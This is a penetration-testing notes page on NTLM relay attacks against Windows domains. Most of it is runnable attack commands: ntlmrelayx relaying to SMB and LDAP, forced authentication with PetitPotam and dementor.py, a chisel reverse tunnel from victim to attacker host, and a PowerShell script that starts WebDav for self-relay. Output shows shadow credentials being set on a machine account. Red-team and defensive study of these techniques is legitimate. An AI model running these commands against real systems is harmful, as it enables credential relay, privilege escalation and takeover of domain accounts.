---
title: Relay attacks
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/relay-attacks
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---

## 1. NTLM Relay

New Technology Lan Manager (NTLM) remains one of the most common authentication protocols used in Windows environments. NTLM is supported in several protocols, for example SMB, HTTP(S), LDAP, IMAP, SMTP, POP3 and MSSQL. Even though Kerberos offers enhanced security features over NTLM, many systems and functions still depend on NTLM, making it impossible for most organizations to move away from it entirely.

Attacker techniques have evolved, and new NTLM exposures have been identified, resulting in various iterations of the NTLM relay attack. At a basic level, the attacker uses man-in-the-middle techniques to listen in on network traffic, ideally listening for some form of authentication challenge being exchanged between the client and server.

### 1.1 ntlmrelayx

With ntlmrelayx, you can use and reuse sessions instead of executing a one-shot attack.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FmoLdY6aZujSMZP2TtinQ%2Fimage.avif?alt=media&amp;token=30fbec85-15c0-48d1-a0ff-06eee7186825" alt=""><figcaption></figcaption></figure>

### 1.2 Relaying NTLM to SMB

The below command creates an SMB relay server that targets the IP 10.10.10.1, meaning any credentials that the SMB server recieves, gets relayed to that IP to attempt to authenticate and execute ‘whoami /all’

```
Target IP: 10.10.10.1

Attacker IP: 10.10.10.2

Domain: test.local

Username: john

Password: password123
```

```python
python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -c 'whoami /all' -debug
```

In order for the SMB server to recieve credentials to relay, dementor.py can be used to trigger a forced authentication from the IP it’s targeting to an attacker controlled SMB server.

```python
python3 dementor.py -u john -p password123 -d test.local 10.10.10.2 10.10.10.1
```

### 1.3 Relaying NTLM to LDAP

```bash
python3 ntlmrelayx.py -t ldap://10.10.10.1 --escalate-user Administrator
```

### 1.4 NTLMRelay2Self over HTTP (Webdav)

Escalate privileges locally by forcing the system you landed initial access on to reflectively authenticate over HTTP to itself and forward the received connection to an HTTP listener (ntlmrelayx) configured to relay to DC servers over LDAP/LDAPs for either setting shadow credentials or configuring RBCD.

To authenticate to itself to port 80 (HTTP), requires the WebClient service and the Printer Spooler service to be running.

To start the WebClient service, we can start responder and use net use on the target:

1. Start responder

```bash
sudo responder -I tun0
```

2. On the target run:

```bash
net use "x: http://attacker-ip/"
```

This will fail, but start the WebClient service. To check if the service is running, you can run:

3. Port forward port 80 to attacker IP
4. Run ntlmrelayx to set shadow credentials

```bash
 proxychains python3 ntlmrelayx.py -domain lab.local -t ldaps://10.2.10.1 --shadow-credentials --shadow-target WIN10\$
```

5. Coerce the  system to authenticate to itself to port 80 (HTTP)

```bash
 python3 PetitPotam.py -u User1 -p Passw0rd01 -d lab.local WIN10@80/print 10.10.177.112
```

If the **msDS-KeyCredentialLink** is already set, you can patch ntlmrelayx to first remove the value and then set it again:

### 1.5 NTLMRelay2Self WebDav without PrinterSpooler & DNS

Situation: We compromised host MS01 and have a shell with low privileges. We will let MS01 authenticate to itself over HTTP and relay the request trough a socks proxy and forward port 80 in order to set shadow credentials. Many times with printerbug.py and PetitPotam.py you need to provide the Net-BIOS name in order for it to work, but using the proxy, we will not need it!

#### 1.5.1 Tools

Chisel <https://github.com/jpillora/chisel>

Socat <https://github.com/tech128/socat-1.7.3.0-windows> (zip the files and unzip at host)

#### 1.5.2 Setup proxy & forward port 80

{% code title="Setup cisel" %}

```bash
# On attack machine
chisel server -p 4444 --reverse &

# On victim machine
.\chisel.exe client 10.10.14.182:4444 R:socks
```

{% endcode %}

{% code title="Setup socat" %}

```bash
# On victim machine
Expand-Archive -Path C:\windows\tasks\socat.zip -DestinationPath C:\windows\tasks\socat\
.\socat.exe tcp-listen:2333,reuseaddr,fork tcp:10.10.14.182:80
```

{% endcode %}

#### 1.5.3 Start WebDav

If WebDav is not started yet:

{% code title="StartWebDav.ps1" lineNumbers="true" %}

```powershell
$Source = @"
using System;
using System.Text;
using System.Security;
using System.Collections.Generic;
using System.Runtime.Versioning;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
using System.Diagnostics.CodeAnalysis;
namespace JosL.WebClient{
public static class Starter{
[StructLayout(LayoutKind.Explicit, Size=16)]
public class EVENT_DESCRIPTOR{
[FieldOffset(0)]ushort Id = 1;
[FieldOffset(2)]byte Version = 0;
[FieldOffset(3)]byte Channel = 0;
[FieldOffset(4)]byte Level = 4;
[FieldOffset(5)]byte Opcode = 0;
[FieldOffset(6)]ushort Task = 0;
[FieldOffset(8)]long Keyword = 0;
}

[StructLayout(LayoutKind.Explicit, Size = 16)]
public struct EventData{
[FieldOffset(0)]
internal UInt64 DataPointer;
[FieldOffset(8)]
internal uint Size;
[FieldOffset(12)]
internal int Reserved;
}

public static void startService(){
Guid webClientTrigger = new Guid(0x22B6D684, 0xFA63, 0x4578, 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7);

long handle = 0;
uint output = EventRegister(ref webClientTrigger, IntPtr.Zero, IntPtr.Zero, ref handle);

bool success = false;

if (output == 0){
EVENT_DESCRIPTOR desc = new EVENT_DESCRIPTOR();
unsafe
{
uint writeOutput = EventWrite(handle, ref desc, 0, null);
success = writeOutput == 0;
EventUnregister(handle);
}
}
}

[DllImport("Advapi32.dll", SetLastError = true)]
public static extern uint EventRegister(ref Guid guid, [Optional] IntPtr EnableCallback, [Optional] IntPtr CallbackContext, [In][Out] ref long RegHandle);

[DllImport("Advapi32.dll", SetLastError = true)]
public static extern unsafe uint EventWrite(long RegHandle, ref EVENT_DESCRIPTOR EventDescriptor, uint UserDataCount, EventData* UserData);

[DllImport("Advapi32.dll", SetLastError = true)]
public static extern uint EventUnregister(long RegHandle);
}
}
"@
$compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
$compilerParameters.CompilerOptions="/unsafe"
Add-Type -TypeDefinition $Source -Language CSharp -CompilerParameters $compilerParameters
[JosL.WebClient.Starter]::startService()
```

{% endcode %}

```bash
.\StartWebDav.ps1
```

Check if WebDav is running remotely:

```
proxychains webclientservicescanner powercorp.local/incendium@192.168.100.101 -hashes :LMHASH
```

#### 1.5.4 Setup ntlmrelayx over proxychains

{% code title="/etc/proxychains4.conf" lineNumbers="true" %}

```
socks5 127.0.0.1 1080
```

{% endcode %}

**Run ntlmrelayx over proxychains to relay to DC over LDAP**

```bash
proxychains impacket-ntlmrelayx -debug -t ldaps://192.168.10.10 -smb2support -domain powercorp.local
```

If msDS-KeyCredentialLink is already set, patch it with <https://github.com/fortra/impacket/pull/1402> and use "-i" parameter with ntlmrelayx

#### 1.5.5 PetitPotam.py to proxy

```bash
proxychains python3 PetitPotam.py -u 'incendium' -hashes :LMHASH -pipe all "ms01@2333/wazzup" 192.168.10.10
```

#### 1.5.6 Results

Inside ntlmrelayx:

```
[*] HTTPD(80): Authenticating against ldaps://192.168.100.100 as POWERCORP.LOCAL/MS01$ SUCCEED
[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000
[+] No more targets
[*] HTTPD(80): Connection from 10.10.11.17 controlled, but there are no more targets left!
```

Because we used "-i" it will start a interactive ldap shell. We can connect to it using nc:

```
nc 127.0.0.1 11000
```

Using the github patch from the shadow creds in ntlm\_relayx, we can first clear the shadow creds that were set before and then set them ourselves:

```bash
# clear_shadow_creds MS01$
Found Target DN: CN=MS01,CN=Computers,DC=powercorp,DC=local
Target SID: S-1-5-21-1045809509-3006658589-959300205-1963

Shadow credentials cleared successfully!

# set_shadow_creds MS01$
Found Target DN: CN=MS01,CN=Computers,powercorp,DC=local
Target SID: S-1-5-21-1045809509-3006658589-959300205-1963

KeyCredential generated with DeviceID: 861d5bf0-3ba4-e4d3-f8a1-49399f9596
Shadow credentials successfully added!
Saved PFX (#PKCS12) certificate & key at path: hd6Uaxvu.pfx
Must be used with password: xIfEsnZZCvCj1pDLHYn3
```
